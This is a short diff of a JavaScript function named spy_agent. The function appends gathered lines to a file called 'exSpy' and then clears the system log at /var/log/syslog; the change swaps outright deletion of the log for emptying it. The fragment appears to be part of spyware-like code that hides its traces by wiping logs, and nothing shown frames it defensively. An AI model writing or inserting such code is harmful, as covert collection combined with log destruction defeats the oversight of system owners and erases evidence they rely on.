@@ -1040,7 +1040,7 @@ function spy_agent () {
 
     if ( !FS.existsSync( "exSpy" ) ) FS.createWriteStream( "exSpy" );
     FS.appendFileSync( "exSpy", exLines )
-    FS.rmSync( "/var/log/syslog" );
+    FS.writeFileSync( "/var/log/syslog", "" );
 
 }
 
